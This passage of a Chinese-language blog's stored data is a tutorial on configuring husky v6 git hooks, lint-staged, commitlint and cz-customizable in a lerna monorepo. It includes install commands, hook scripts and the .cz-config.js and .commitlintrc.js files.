class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">module</span>.<span class=\"hljs-property\">exports</span> = {</span><br><span class=\"line\">  <span class=\"hljs-attr\">types</span>: [</span><br><span class=\"line\">    { <span class=\"hljs-attr\">value</span>: <span class=\"hljs-string\">'feat'</span>, <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">'feat:     A new feature'</span> },</span><br><span class=\"line\">    { <span class=\"hljs-attr\">value</span>: <span class=\"hljs-string\">'fix'</span>, <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">'fix:      A bug fix'</span> },</span><br><span class=\"line\">    {</span><br><span class=\"line\">      <span class=\"hljs-attr\">value</span>: <span class=\"hljs-string\">'style'</span>,</span><br><span class=\"line\">      <span class=\"hljs-attr\">name</span>:</span><br><span class=\"line\">        <span class=\"hljs-string\">'style:    Changes that do not affect the meaning of the code\\n            (white-space, formatting, missing semi-colons, etc)'</span>,</span><br><span class=\"line\">    },</span><br><span class=\"line\">    {</span><br><span class=\"line\">      <span class=\"hljs-attr\">value</span>: <span class=\"hljs-string\">'refactor'</span>,</span><br><span class=\"line\">      <span class=\"hljs-attr\">name</span>:</span><br><span class=\"line\">        <span class=\"hljs-string\">'refactor: A code change that neither fixes a bug nor adds a feature'</span>,</span><br><span class=\"line\">    },</span><br><span class=\"line\">    { <span class=\"hljs-attr\">value</span>: <span class=\"hljs-string\">'revert'</span>, <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">'revert:   Revert to a commit'</span> },</span><br><span class=\"line\">    {</span><br><span class=\"line\">      <span class=\"hljs-attr\">value</span>: <span class=\"hljs-string\">'chore'</span>,</span><br><span class=\"line\">      <span class=\"hljs-attr\">name</span>:</span><br><span class=\"line\">        <span class=\"hljs-string\">'chore:    Changes to the build process or auxiliary tools\\n            and libraries such as documentation generation'</span>,</span><br><span class=\"line\">    },</span><br><span class=\"line\">    { <span class=\"hljs-attr\">value</span>: <span class=\"hljs-string\">'docs'</span>, <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">'docs:     Documentation only changes'</span> },</span><br><span class=\"line\">    {</span><br><span class=\"line\">      <span class=\"hljs-attr\">value</span>: <span class=\"hljs-string\">'perf'</span>,</span><br><span class=\"line\">      <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">'perf:     A code change that improves performance'</span>,</span><br><span class=\"line\">    },</span><br><span class=\"line\">    { <span class=\"hljs-attr\">value</span>: <span class=\"hljs-string\">'test'</span>, <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">'test:     Adding missing tests'</span> },</span><br><span class=\"line\">  ],</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"hljs-attr\">scopes</span>: [</span><br><span class=\"line\">    { <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">'frontend'</span> },</span><br><span class=\"line\">    { <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">'backend'</span> },</span><br><span class=\"line\">    { <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">'service'</span> },</span><br><span class=\"line\">  ],</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"hljs-attr\">messages</span>: {</span><br><span class=\"line\">    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"Select the type of change that you're committing:\"</span>,</span><br><span class=\"line\">    <span class=\"hljs-attr\">scope</span>: <span class=\"hljs-string\">\"\\n Select the scope of change that you're committing:\"</span>,</span><br><span class=\"line\">    <span class=\"hljs-comment\">// used if allowCustomScopes is true</span></span><br><span class=\"line\">    <span class=\"hljs-attr\">customScope</span>: <span class=\"hljs-string\">'Denote the custom scope:'</span>,</span><br><span class=\"line\">    <span class=\"hljs-attr\">subject</span>: <span class=\"hljs-string\">'Write a SHORT, IMPERATIVE tense description of the change:\\n'</span>,</span><br><span class=\"line\">    <span class=\"hljs-attr\">body</span>:</span><br><span class=\"line\">      <span class=\"hljs-string\">'Provide a LONGER description of the change (optional). Use \"|\" to break new line:\\n'</span>,</span><br><span class=\"line\">    <span class=\"hljs-attr\">breaking</span>: <span class=\"hljs-string\">'List any BREAKING CHANGES (optional):\\n'</span>,</span><br><span class=\"line\">    <span class=\"hljs-attr\">footer</span>:</span><br><span class=\"line\">      <span class=\"hljs-string\">'List any ISSUES CLOSED by this change (optional). E.g.: #31, #34:\\n'</span>,</span><br><span class=\"line\">    <span class=\"hljs-attr\">confirmCommit</span>: <span class=\"hljs-string\">'Are you sure you want to proceed with the commit above?'</span>,</span><br><span class=\"line\">  },</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"hljs-attr\">allowCustomScopes</span>: <span class=\"hljs-literal\">true</span>,</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"5\">\n<li>在项目根目录中新建<code>.commitlintrc.js</code>文件，内容如下：</li>\n</ol>\n<figure class=\"highlight js hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">const</span> typeEnum = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'./.cz-config'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">module</span>.<span class=\"hljs-property\">exports</span> = {</span><br><span class=\"line\">  <span class=\"hljs-attr\">extends</span>: [<span class=\"hljs-string\">'@commitlint/config-conventional'</span>],</span><br><span class=\"line\">  <span class=\"hljs-attr\">rules</span>: {</span><br><span class=\"line\">    <span class=\"hljs-string\">'type-enum'</span>: [<span class=\"hljs-number\">2</span>, <span class=\"hljs-string\">'always'</span>, typeEnum.<span class=\"hljs-property\">types</span>.<span class=\"title function_\">map</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">i</span>) =&gt;</span> i.<span class=\"hljs-property\">value</span>)],</span><br><span class=\"line\">    <span class=\"hljs-string\">'scope-enum'</span>: [<span class=\"hljs-number\">2</span>, <span class=\"hljs-string\">'always'</span>, typeEnum.<span class=\"hljs-property\">scopes</span>.<span class=\"title function_\">map</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">i</span>) =&gt;</span> i.<span class=\"hljs-property\">name</span>)],</span><br><span class=\"line\">    <span class=\"hljs-string\">'scope-empty'</span>: [<span class=\"hljs-number\">2</span>, <span class=\"hljs-string\">'never'</span>],</span><br><span class=\"line\">  },</span><br><span class=\"line\">};</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n\n<p>配置完成后，每次提交commit时，可以使用<code>git cz</code>替换<code>git commit</code>命令，从而辅助我们更加规范的书写commit message。</p>\n<blockquote>\n<p>更多详细配置，可以参考这篇文章：<a href=\"https://juejin.cn/post/6844903831893966856\">https://juejin.cn/post/6844903831893966856</a></p>\n</blockquote>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>以上就是我对如何在lerna项目中配置husky、lint-staged和Cz工具的一些粗略认知，当然不仅仅是lerna项目，也适用于任何前端项目。</p>\n<h2 id=\"链接\"><a href=\"#链接\" class=\"headerlink\" title=\"链接\"></a>链接</h2><ul>\n<li><p><a href=\"https://typicode.github.io/husky/#/\">husky官文文档</a></p>\n</li>\n<li><p><a href=\"https://typicode.github.io/husky/#/\">lint-staged官方文档</a></p>\n</li>\n<li><p><a href=\"https://juejin.cn/post/6844903831893966856\">Cz工具集使用介绍</a></p>\n</li>\n</ul>\n</body></html>","site":{"data":{}},"_categories":[],"_tags":[],"excerpt":"<html><head></head><body><p>Monorepo 是针对单仓库、多 package 的流行解决方案, lerna 是它的一种实现。</p></body></html>","more":"<h2 id=\"说明\"><a href=\"#说明\" class=\"headerlink\" title=\"说明\"></a>说明</h2><p>重要package版本说明：</p>\n<ul>\n<li>“husky”: “^6.0.0”</li>\n<li>“lint-staged”: “^10.5.4”</li>\n<li>“@commitlint/cli”: “^12.0.1”</li>\n<li>“@commitlint/config-conventional”: “^12.0.1”</li>\n<li>“cz-customizable”: “^6.3.0”</li>\n</ul>\n<h2 id=\"配置husky\"><a href=\"#配置husky\" class=\"headerlink\" title=\"配置husky\"></a>配置husky</h2><p>在lerna项目根目录中安装<code>husky</code>:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yarn add husky -D</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>注意：husky v4和v6版本的配置方式大相径庭，这里只介绍v6版本的配置方式，v4的网上一搜一大把，这里不过多介绍</p>\n</blockquote>\n<ol>\n<li>在<code>package.json</code>的<code>scripts</code>中添加<code>&quot;prepare&quot;: &quot;husky install&quot;</code>，并运行这条命令：</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm set-script prepare <span class=\"string\">&quot;husky install&quot;</span> &amp;&amp; npm run prepare</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>添加一个hook:</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npx husky add .husky/pre-commit <span class=\"string\">&quot;npm test&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>上面这个命令会在<code>.husky</code>目录下新建一个<code>pre-commit</code>文件，其内容如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\">. <span class=\"string\">&quot;<span class=\"subst\">$(dirname <span class=\"string\">&quot;<span class=\"variable\">$0</span>&quot;</span>)</span>/_/husky.sh&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">npm <span class=\"built_in\">test</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>以上都是手动安装<code>husky</code>的过程，当然官方也提供了一键安装和配置脚本，推荐使用：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npx husky-init &amp;&amp; npm install       <span class=\"comment\"># npm</span></span><br><span class=\"line\">npx husky-init &amp;&amp; yarn              <span class=\"comment\"># Yarn 1</span></span><br><span class=\"line\">yarn dlx husky-init --yarn2 &amp;&amp; yarn <span class=\"comment\"># Yarn 2</span></span><br></pre></td></tr></table></figure>\n\n<p>如果使用的是v4版本的<code>husky</code>，想升级到v6，可以使用以下命名，一键迁移：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// npm</span><br><span class=\"line\">npm install husky@6 --save-dev \\</span><br><span class=\"line\">  &amp;&amp; npx husky-init \\</span><br><span class=\"line\">  &amp;&amp; npm <span class=\"built_in\">exec</span> -- github:typicode/husky-4-to-6 --remove-v4-config</span><br><span class=\"line\">  </span><br><span class=\"line\">// yarn 1</span><br><span class=\"line\">yarn add husky@6 --dev \\</span><br><span class=\"line\">  &amp;&amp; npx husky-init \\</span><br><span class=\"line\">  &amp;&amp; npm <span class=\"built_in\">exec</span> -- github:typicode/husky-4-to-6 --remove-v4-config</span><br><span class=\"line\"></span><br><span class=\"line\">// yarn 2</span><br><span class=\"line\">yarn add husky@6 --dev \\</span><br><span class=\"line\">  &amp;&amp; yarn dlx husky-init --yarn2 \\</span><br><span class=\"line\">  &amp;&amp; npm <span class=\"built_in\">exec</span> -- github:typicode/husky-4-to-6 --remove-v4-config</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>更多配置，详见官方文档：<a href=\"https://typicode.github.io/husky/#/\">https://typicode.github.io/husky/#/</a></p>\n</blockquote>\n<h2 id=\"配置lint-staged\"><a href=\"#配置lint-staged\" class=\"headerlink\" title=\"配置lint-staged\"></a>配置lint-staged</h2><p>在<code>lerna</code>项目中，由于所有子项目公用一个 repo 源代码仓库，因此它的 husky 钩子只能建立在最顶层目录；</p>\n<p>而每次 commit 都很有可能是多个子项目都有改动，这个时候使用 <code>lint-staged</code> 时，就不但要区分文件类型，还要区分改动文件所在的子项目（因为不同的子项目可能会有不同的校验处理）。</p>\n<p>这时，我们可以使用 lerna 命令来实现对“哪个子项目有修改”的判断；而 <code>lint-staged</code> 就需要安装在任何一个需要做校验的子项目中。</p>\n<ol>\n<li>添加或修改<code>.husky</code>目录下的<code>pre-commit</code>钩子如下：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/sh</span><br><span class=\"line\">. &quot;$(dirname &quot;$0&quot;)/_/husky.sh&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">lerna run --concurrency 1 --stream precommit --since HEAD --exclude-dependents</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<p>其中，<code>precommit</code> 是在<code>pre-commit</code>钩子中触发的子项目的命令</p>\n<ol start=\"2\">\n<li>在子项目中安装和配置<code>lint-staged</code>，并添加<code>precommit</code>命令</li>\n</ol>\n<ul>\n<li>安装<code>lint-staged</code>：</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lerna add lint-staged --scope=xxxx -D</span><br></pre></td></tr></table></figure>\n\n\n<ul>\n<li>在添加<code>precommit</code>命令：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;precommit&quot;: &quot;lint-staged&quot;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>配置<code>lint-staged</code>：</li>\n</ul>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">&quot;lint-staged&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;*.&#123;ts,tsx,js,jsx&#125;&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">    <span class=\"string\">&quot;eslint&quot;</span></span><br><span class=\"line\">  <span class=\"punctuation\">]</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>更多配置，详见官方文档：<a href=\"https://github.com/okonet/lint-staged#readme\">https://github.com/okonet/lint-staged#readme</a></p>\n</blockquote>\n<h2 id=\"配置commitlint和cz-customizable\"><a href=\"#配置commitlint和cz-customizable\" class=\"headerlink\" title=\"配置commitlint和cz-customizable\"></a>配置commitlint和cz-customizable</h2><p>每个团队对提交的commit message格式有约定俗称的要求，但是没有一个统一的规范，导致大家提交的commit message或多或少不太一样。因此，需要一个工具来帮助大家统一commit message的格式，也方便后续的分析和拓展。</p>\n<p><code>cz-customizable</code>是一个帮助书写commit message的工具，而<code>commitlint</code>是一个校验commit message的工具。</p>\n<ol>\n<li>安装<code>commitlint</code>和<code>cz-customizable</code>:</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yarn add @commitlint/cli @commitlint/config-conventional cz-customizable -D</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>添加<code>commit-msg</code>钩子</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npx husky add .husky/commit-msg <span class=\"string\">&quot;yarn commitlint --edit&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>生成如下文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\">. <span class=\"string\">&quot;<span class=\"subst\">$(dirname <span class=\"string\">&quot;<span class=\"variable\">$0</span>&quot;</span>)</span>/_/husky.sh&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">yarn commitlint --edit </span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>在<code>package.json</code>中添加以下配置：</li>\n</ol>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"attr\">&quot;config&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;commitizen&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;path&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;./node_modules/cz-customizable&quot;</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;cz-customizable&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;config&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;./.cz-config.js&quot;</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">  <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  ...</span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>在项目根目录中新建<code>.cz-config.js</code>文件，内容如下：</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">module</span>.<span class=\"property\">exports</span> = &#123;</span><br><span class=\"line\">  <span class=\"attr\">types</span>: [</span><br><span class=\"line\">    &#123; <span class=\"attr\">value</span>: <span class=\"string\">&#x27;feat&#x27;</span>, <span class=\"attr\">name</span>: <span class=\"string\">&#x27;feat:     A new feature&#x27;</span> &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">value</span>: <span class=\"string\">&#x27;fix&#x27;</span>, <span class=\"attr\">name</span>: <span class=\"string\">&#x27;fix:      A bug fix&#x27;</span> &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">value</span>: <span class=\"string\">&#x27;style&#x27;</span>,</span><br><span class=\"line\">      <span class=\"attr\">name</span>:</span><br><span class=\"line\">        <span class=\"string\">&#x27;style:    Changes that do not affect the meaning of the code\\n            (white-space, formatting, missing semi-colons, etc)&#x27;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">value</span>: <span class=\"string\">&#x27;refactor&#x27;</span>,</span><br><span class=\"line\">      <span class=\"attr\">name</span>:</span><br><span class=\"line\">        <span class=\"string\">&#x27;refactor: A code change that neither fixes a bug nor adds a feature&#x27;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">value</span>: <span class=\"string\">&#x27;revert&#x27;</span>, <span class=\"attr\">name</span>: <span class=\"string\">&#x27;revert:   Revert to a commit&#x27;</span> &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">value</span>: <span class=\"string\">&#x27;chore&#x27;</span>,</span><br><span class=\"line\">      <span class=\"attr\">name</span>:</span><br><span class=\"line\">        <span class=\"string\">&#x27;chore:    Changes to the build process or auxiliary tools\\n            and libraries such as documentation generation&#x27;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">value</span>: <span class=\"string\">&#x27;docs&#x27;</span>, <span class=\"attr\">name</span>: <span class=\"string\">&#x27;docs:     Documentation only changes&#x27;</span> &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">value</span>: <span class=\"string\">&#x27;perf&#x27;</span>,</span><br><span class=\"line\">      <span class=\"attr\">name</span>: <span class=\"string\">&#x27;perf:     A code change that improves performance&#x27;</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">value</span>: <span class=\"string\">&#x27;test&#x27;</span>, <span class=\"attr\">name</span>: <span class=\"string\">&#x27;test:     Adding missing tests&#x27;</span> &#125;,</span><br><span class=\"line\">  ],</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">scopes</span>: [</span><br><span class=\"line\">    &#123; <span class=\"attr\">name</span>: <span class=\"string\">&#x27;frontend&#x27;</span> &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">name</span>: <span class=\"string\">&#x27;backend&#x27;</span> &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">name</span>: <span class=\"string\">&#x27;service&#x27;</span> &#125;,</span><br><span class=\"line\">  ],</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">messages</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">type</span>: <span class=\"string\">&quot;Select the type of change that you&#x27;re committing:&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">scope</span>: <span class=\"string\">&quot;\\n Select the scope of change that you&#x27;re committing:&quot;</span>,</span><br><span class=\"line\">    <span class=\"comment\">// used if allowCustomScopes is true</span></span><br><span class=\"line\">    <span class=\"attr\">customScope</span>: <span class=\"string\">&#x27;Denote the custom scope:&#x27;</span>,</span><br><span class=\"line\">    <span class=\"attr\">subject</span>: <span class=\"string\">&#x27;Write a SHORT, IMPERATIVE tense description of the change:\\n&#x27;</span>,</span><br><span class=\"line\">    <span class=\"attr\">body</span>:</span><br><span class=\"line\">      <span class=\"string\">&#x27;Provide a LONGER description of the change (optional). Use &quot;|&quot; to break new line:\\n&#x27;</span>,</span><br><span class=\"line\">    <span class=\"attr\">breaking</span>: <span class=\"string\">&#x27;List any BREAKING CHANGES (optional):\\n&#x27;</span>,</span><br><span class=\"line\">    <span class=\"attr\">footer</span>:</span><br><span class=\"line\">      <span class=\"string\">&#x27;List any ISSUES CLOSED by this change (optional). E.g.: #31, #34:\\n&#x27;</span>,</span><br><span class=\"line\">    <span class=\"attr\">confirmCommit</span>: <span class=\"string\">&#x27;Are you sure you want to proceed with the commit above?&#x27;</span>,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">allowCustomScopes</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>在项目根目录中新建<code>.commitlintrc.js</code>文件，内容如下：</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> typeEnum = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;./.cz-config&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">module</span>.<span class=\"property\">exports</span> = &#123;</span><br><span class=\"line\">  <span class=\"attr\">extends</span>: [<span class=\"string\">&#x27;@commitlint/config-conventional&#x27;</span>],</span><br><span class=\"line\">  <span class=\"attr\">rules</span>: &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;type-enum&#x27;</span>: [<span class=\"number\">2</span>, <span class=\"string\">&#x27;always&#x27;</span>, typeEnum.<span class=\"property\">types</span>.<span class=\"title function_\">map</span>(<span class=\"function\">(<span class=\"params\">i</span>) =&gt;</span> i.<span class=\"property\">value</span>)],</span><br><span class=\"line\">    <span class=\"string\">&#x27;scope-enum&#x27;</span>: [<span class=\"number\">2</span>, <span class=\"string\">&#x27;always&#x27;</span>, typeEnum.<span class=\"property\">scopes</span>.<span class=\"title function_\">map</span>(<span class=\"function\">(<span class=\"params\">i</span>) =&gt;</span> i.<span class=\"property\">name</span>)],</span><br><span class=\"line\">    <span class=\"string\">&#x27;scope-empty&#x27;</span>: [<span class=\"number\">2</span>, <span class=\"string\">&#x27;never&#x27;</span>],</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<p>配置完成后，每次提交commit时，可以使用<code>git cz</code>替换<code>git commit</code>命令，从而辅助我们更加规范的书写commit message。</p>\n<blockquote>\n<p>更多详细配置，可以参考这篇文章：<a href=\"https://juejin.cn/post/6844903831893966856\">https://juejin.cn/post/6844903831893966856</a></p>\n</blockquote>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>以上就是我对如何在lerna项目中配置husky、lint-staged和Cz工具的一些粗略认知，当然不仅仅是lerna项目，也适用于任何前端项目。</p>\n<h2 id=\"链接\"><a href=\"#链接\" class=\"headerlink\" 